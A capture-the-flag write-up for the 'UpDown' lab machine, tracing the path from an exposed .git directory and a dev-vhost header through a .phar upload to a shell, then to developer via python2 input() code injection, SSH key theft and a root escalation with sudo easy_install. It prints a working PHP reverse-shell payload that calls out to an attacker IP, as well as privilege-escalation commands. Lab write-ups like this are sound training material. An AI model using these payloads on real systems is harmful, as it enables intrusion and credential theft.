## Summary

We found a `.git` directory in `/dev/`, we were able to reconstruct a repository and access the files in it.
One of files was `.htaccess` which disclosed a header we used to access `dev` virtual host.
`http://dev.siteisup.htb/` allowed us to upload a malicious file `.phar`, we used it to gain a shell as `www-data`.
We found a `python2` script that uses a vulnerable function `input()`, which we leveraged to gain a shell as `developer`.
As `develeper` we were able to gain a `root` shell by executing `easy_install` using `sudo`.

## **Enumeration**

We started with a `nmap` scan and got 2 open ports:

- 80 - Apache 2.4.41
- 22 - OpenSSH 8.2p1

```sh
$ sudo nmap 10.10.11.177 -sV -oA nmap/10.10.11.177

```

### **http**

Browsing to `http://10.10.11.177/` we see this home page

![](/assets/updown/homepage.png)

> This website takes a url and checks if it is up or not. It also has a debug option, when enabled it shows the response too.

We fuzzed the url `http://siteisup.htb/` for hidden directories, and we found `/dev`

```sh
ffuf -u http://siteisup.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302 ffuf-10.10.11.177.json
```

![](/assets/updown/ffuf.png)

We did the same thing with `http://10.10.11.177/dev/` and we found a `/.git`

```sh
ffuf -u http://siteisup.htb/dev/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,301,302 -o ffuf-10.10.11.177-dev.json
```

![](/assets/updown/ffuf-dev.png)

We used [git-dumper](https://github.com/arthaud/git-dumper) to get the git repo

```
git-dumper http://siteisup.htb/dev/.git git-10.10.11.177
```

![](/assets/updown/git-dumper.png)

`git log` revealed that there is some kind of protection around `dev` vhost

```
git log
```

![](/assets/updown/git-log.png)

Reading the content of `.htaccess`, we can see that there is a special header "`Special-Dev: only4dev`" which we can only assume is required to access `dev` vhost

```
cat .htaccess
```

![](/assets/updown/htaccess.png)

To prove our thought we browsed to `http://dev.siteisup.htb/` without the special header and got `403 Forbidden` response.  
After adding `Special-Dev` header we got a page semilar to the one we saw before, but it accepts a file instead of just a URL.

![](/assets/updown/homepage-dev.png)

#### **`index.php` analysis**

what happens here is the query parameter `page` is matched against a regex `/bin|usr|home|var|etc/i`, then `.php` is appended to it before including it.  
if `page` is not provided `checker.php` is included, which is the page we saw when we browsed to `http://dev.siteisup.htb`

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                error_log($page . ".php");
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```

#### **`checker.php` analysis**

We have an upload form, that uses a `POST` request to upload a file.

```php
<form method="post" enctype="multipart/form-data">
        <label>List of websites to check:</label><br><br>
        <input type="file" name="file" size="50">
        <input name="check" type="submit" value="Check">
</form>
```

When the post request arrives, it checks if the request body contains `check` which means a file is being uploaded.

```php
if($_POST['check']){
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
```

After that it checks that the file is smaller than `10kb`, and the extension is not blacklisted.

> Not all the extensions we can use to upload a reverse shell are blacklisted, for example `phar` can be used.

Then it creates a directory from the `md5` hash of the current time.

```php
$file = $_FILES['file']['name'];
# Check if extension is allowed.
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
        die("Extension not allowed!");
}
# Create directory to upload our file.
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
mkdir($dir, 0770, true);
```

After, it gets the file content using `file_get_contents()`, then it calls `isitup()` for each line.  
When it is done processing the file it deletes it using `@unlink()`.

```php
# Read the uploaded file.
$websites = explode("\n",file_get_contents($final_path));
foreach($websites as $site){
        $site=trim($site);
        if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                $check=isitup($site);
                if($check){
                        echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                }else{
                        echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                }
        }else{
                echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
        }
}
# Delete the uploaded file.
@unlink($final_path);
```

#### **Testing File upload**

We created a file `00.phar`:

```php
http://10.10.14.95:9000/
<?php phpinfo(); ?>
```

The first line is used to prevent the deletion of our uploaded file before executing it.  
When the server sends a request to our nc server using the funcion `isitup()`, it will wait for a response which will never arrive,
we can use this time to browse to our uploaded file `http://dev.siteisup.htb/uploads/<md5(time)>/00.phar` to execute it.

> note: http://dev.site.htb/uploads/ is listable.

We setup a listener on port `9000`

![](/assets/updown/nc-9000.png)

Then we uploaded `00.phar`

![](/assets/updown/upload-poc.png)

we can see that we recieved a request on our listener.

![](/assets/updown/nc-9000-req.png)

After browsing to `http://dev.siteisup.htb/uploads/<md5(time)>/00.phar` we can see a `phpinfo` page.

![](/assets/updown/phpinfo.png)

Going throught the `phpinfo` page, we found that some functions are disabled, mostly those that we can use to execute system commands.

![](/assets/updown/disable-functions.png)

According to [Hacktrick]({{page.hacktrick}}), we can use `proc_open()` to execute system commands, and it's not disabled.

## **Initial Access**

we created a file `01.phar` containig a [bash reverse shell]({{page.pat}}) executed using [proc_open()]({{hacktrick}})

```php
http://10.10.14.95:9000/
<?php
echo proc_close(proc_open("bash -c 'sh -i >& /dev/tcp/10.10.14.95/1337 0>&1'",array(),$something));
?>
```

We setup two listeners, one on port `1337` to recieve the shell, and the second on port `9000` as before to give us time to execute this file.

![](/assets/updown/nc-rev.png)

Then we uploaded `01.phar`

![](/assets/updown/revshell-upload.png)

As we did before, we browsed to `/uploads/<md5(time)>/01.phar`

![](/assets/updown/revshell-exec.png)

Going back to our listener we can see that we recieved a shell as `www-data`.

![](/assets/updown/revshell.png)

### **Gaining shell as `developer` user**

We changed directory to `/home/developer/dev` and found two interesting files `siteisup` which has the `SUID` bit set and `siteisup_test.py`.

![](/assets/updown/ls-dev.png)

`siteisup` is an `elf` executable.  
we used `strings` to see it's content.

```sh
strings siteisup
```

We found that it executes `/usr/bin/python /home/developer/dev/siteisup_test.py`

![](/assets/updown/strings-siteisup.png)

`siteisup_test.py` is a python2 script (note that print does not use parenthesis).

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

`input()` function in python2 can be leveraged to execute code.

> For example, if a malicious user imports the OS module, he can execute code on the server,
> hence leading to Remote Code Execution.

[source](https://infosecwriteups.com/python-2-vulnerabilities-c3a3779f6fc)

To test this we provided `__import__("os").system("uname -a; id")` us input, and it was executed as `developer`

![](/assets/updown/input-rce-poc.png)

After that, we provided `__import__("os").system("bash -p")` as input to get a shell as `developer`

![](/assets/updown/developer-shell.png)

We tried to read the flag but it was only readable by `developer` group,
and if you notice the output of `id` you can see that we are not in that group `gid=33(www-data)`.  
To work arround this, we downloaded `/home/developer/.ssh/id_rsa` and used to login as `developer` using `ssh`

```
chmod 0600 id_rsa
ssh -i id_rsa developer@10.10.11.177
```

![](/assets/updown/ssh-developer.png)

## **PrivEsc**

We used `sudo -l` and found that `developer` can run `/usr/local/bin/easy_install` as `root` without a password

![](/assets/updown/sudo-l.png)

According to [GTFOBins]({{page.GTFOBins}}) we can use `easy_install` to escalate our privileges.

```sh
TF=$(mktemp -d)
echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
